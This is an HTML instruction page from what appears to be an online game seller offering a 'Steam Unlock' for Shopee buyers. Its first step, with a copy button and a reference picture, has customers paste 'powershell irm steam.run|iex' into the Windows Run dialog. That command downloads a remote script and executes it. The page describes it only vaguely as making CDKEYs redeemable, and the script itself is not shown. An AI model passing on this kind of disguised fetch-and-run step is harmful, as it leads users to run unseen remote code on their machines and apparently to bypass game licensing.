<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Steam Unlock â€¢ Instructions</title>
  <style>
    :root{
      --bg:#0b0f1a; --card:#111827; --text:#e5e7eb; --muted:#9ca3af;
      --accent:#8b5cf6; --border:#1f2937;
    }
    *{box-sizing:border-box}
    body{
      margin:0; font-family:'Segoe UI',Tahoma,sans-serif;
      background:radial-gradient(1100px 500px at 5% 0%, #181f32 0, transparent 60%), var(--bg);
      color:var(--text); min-height:100vh;
    }
    header{display:flex;justify-content:space-between;align-items:center;padding:16px 18px 10px;}
    .brand{display:flex;gap:10px;align-items:center}
    .brand h1{margin:0;font-size:1.15rem}
    .brand small{color:var(--muted)}
    .btn{background:var(--accent);color:#fff;padding:6px 12px;border-radius:999px;text-decoration:none;font-weight:600}
    main{max-width:900px;margin:0 auto;padding:16px 16px 28px}
    .card{
      background:rgba(17,24,39,.85); border:1px solid rgba(31,41,55,.9);
      border-radius:16px; padding:16px; margin-bottom:18px; box-shadow:0 12px 32px rgba(0,0,0,.25);
    }
    .result-box{
      margin-top:10px;background:rgba(15,23,42,.55);border:1px solid rgba(148,163,184,.15);
      border-radius:10px;padding:10px 12px
    }
    .copy{display:inline-block;margin-left:8px;padding:4px 8px;border-radius:6px;background:#374151;color:#fff;border:none;cursor:pointer}
    ol.step-list{margin-top:12px;padding-left:20px;line-height:1.6}
    ol.step-list li{margin-bottom:10px}
    code{
      background:#0b1220; border:1px solid rgba(148,163,184,.28);
      padding:3px 6px 4px; border-radius:6px; font-size:.9rem; color:#e2e8f0
    }
    .explain{margin-top:12px;background:rgba(139,92,246,.08);border:1px solid rgba(139,92,246,.25);border-radius:10px;padding:10px 12px}
    .ref{
      margin-top:14px;background:rgba(15,23,42,.6);border:1px dashed rgba(148,163,184,.4);
      border-radius:12px;padding:10px;text-align:center
    }
    .ref img{max-width:100%;border-radius:10px}
    .ref .cap{margin-top:6px;color:var(--muted);font-size:.85rem}
    footer{text-align:center;color:var(--muted);font-size:.85rem;padding:14px 0 18px}
  </style>
</head>
<body>
  <header>
    <div class="brand">
      <img src="steamunlock_wannabe.png" alt="" style="width:42px;height:42px;object-fit:contain" onerror="this.style.display='none'">
      <div>
        <h1>Steam Unlock â€” Instructions</h1>
        <small>For Shopee customers</small>
      </div>
    </div>
    <a class="btn" href="https://barryhamsy.github.io/gamelist/" target="_blank" rel="noopener">ðŸ”— Main Site</a>
  </header>

  <main>
    <!-- OPTIONAL CDKEY/AppID/Game block (shows only if URL params are present) -->
    <div id="orderCard" class="card" style="display:none">
      <h2 style="margin:0 0 6px">Your Details</h2>
      <div class="result-box">
        <p><strong>Steam CDKEY:</strong> <span id="cdkeyText"></span>
           <button class="copy" id="copyKeyBtn" title="Copy CDKEY">Copy</button></p>
        <p><strong>Game AppID:</strong> <span id="appidText"></span></p>
        <p><strong>Game Name:</strong> <span id="nameText"></span></p>
      </div>
    </div>

    <!-- Part 1: Run command -->
    <div class="card">
      <h2 style="margin:0 0 6px">Run this command first</h2>
      <ol class="step-list">
        <li><strong>Press the Windows Start menu.</strong></li>
        <li><strong>Type</strong> <em>Run</em> and open the <strong>Run</strong> dialog.</li>
        <li>In the Run box, type:
          <div style="margin-top:6px">
            <code id="cmd">powershell&nbsp;&nbsp;irm&nbsp;steam.run|iex</code>
            <button class="copy" id="copyCmdBtn" title="Copy command">Copy</button>
          </div>
        </li>
      </ol>
      <div class="explain">
        <h3 style="margin:0 0 4px;font-size:1rem">What does this command do?</h3>
        <p style="margin:0">
          This PowerShell command makes sure your Steam CDKEY can be redeemed and avoids common errors.
          If you change/format your PC later, just run this command once again â€” your games will appear again.
        </p>
      </div>
      <div class="ref">
        <img src="steam_run_reference.png" alt="Windows Run dialog example" onerror="this.src='placeholder.jpg'">
        <div class="cap">Example: Run dialog with <code>powershell&nbsp;irm&nbsp;steam.run|iex</code></div>
      </div>
    </div>

    <!-- Part 2: Redeem on Steam -->
    <div class="card">
      <h2 style="margin:0">How to redeem the CDKEY</h2>
      <ol class="step-list">
        <li>Open <strong>Steam</strong>, click <strong>Games</strong> at the top-left.</li>
        <li>Select <strong>Activate a product on Steamâ€¦</strong></li>
        <li>Paste your <strong>CDKEY</strong> and confirm the prompts.</li>
        <li><strong>Restart Steam</strong> after activation.</li>
      </ol>
      <div class="ref">
        <img src="steam_activate_product.png" alt="Steam â†’ Games â†’ Activate a Product" onerror="this.src='placeholder.jpg'">
        <div class="cap">Example: Steam â†’ <code>Games</code> â†’ <code>Activate a product on Steam</code></div>
      </div>
    </div>
  </main>

  <footer>Â© 2025 Barryâ€™s Game Store</footer>

  <script>
    // Read optional params: ?cdkey=XXXX&appid=123&name=Game%20Name
    (function(){
      const params = new URLSearchParams(location.search);
      const cdkey = (params.get('cdkey') || '').trim();
      const appid = (params.get('appid') || '').trim();
      const name  = (params.get('name')  || '').trim();

      const card  = document.getElementById('orderCard');
      const kEl   = document.getElementById('cdkeyText');
      const aEl   = document.getElementById('appidText');
      const nEl   = document.getElementById('nameText');

      if (cdkey || appid || name){
        if (cdkey) kEl.textContent = cdkey; else kEl.textContent = '(not provided)';
        if (appid) aEl.textContent = appid; else aEl.textContent = '(not provided)';
        if (name)  nEl.textContent = name;  else nEl.textContent = '(not provided)';
        card.style.display = 'block';
      }

      // Copy helpers
      function copy(text){
        try{
          navigator.clipboard.writeText(text);
          alert('Copied!');
        }catch(e){
          // fallback for old browsers
          const ta = document.createElement('textarea');
          ta.value = text; document.body.appendChild(ta); ta.select();
          try{ document.execCommand('copy'); alert('Copied!'); }catch(_){}
          document.body.removeChild(ta);
        }
      }

      document.getElementById('copyCmdBtn').addEventListener('click', function(){
        copy('powershell  irm steam.run|iex');
      });

      document.getElementById('copyKeyBtn').addEventListener('click', function(){
        const v = kEl.textContent || '';
        if (!v || v === '(not provided)'){ alert('No CDKEY to copy'); return; }
        copy(v);
      });
    })();
  </script>
</body>
</html>
